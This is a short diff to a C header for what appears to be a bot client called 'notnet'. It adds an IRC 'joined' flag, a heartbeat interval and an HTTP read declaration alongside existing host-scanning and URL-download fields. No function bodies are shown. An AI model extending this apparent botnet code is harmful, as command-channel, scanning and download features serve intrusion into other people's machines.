@@ -25,6 +25,7 @@ typedef struct {
     int sock;
     int connected;
     int authenticated;
+    int joined;
     time_t last_ping;
 } notnet_irc_t;
 
@@ -98,6 +99,9 @@ typedef struct {
     uint32_t scan_timeout_ms;
     uint32_t scan_max_hosts;
 
+    /* Heartbeat interval in seconds (0 = use default) */
+    uint32_t heartbeat_interval;
+
     /* Update tracking */
     time_t last_update;
 } notnet_bot_t;
@@ -112,6 +116,7 @@ void irc_disconnect(notnet_bot_t *bot);
 int http_connect(notnet_bot_t *bot);
 int http_post(notnet_bot_t *bot, const char *data, int len);
 int http_get(notnet_bot_t *bot, char *buf, int len);
+int http_read(notnet_bot_t *bot, char *buf, int len);
 int http_download(notnet_bot_t *bot, const char *url, const char *dest);
 void http_disconnect(notnet_bot_t *bot);
 
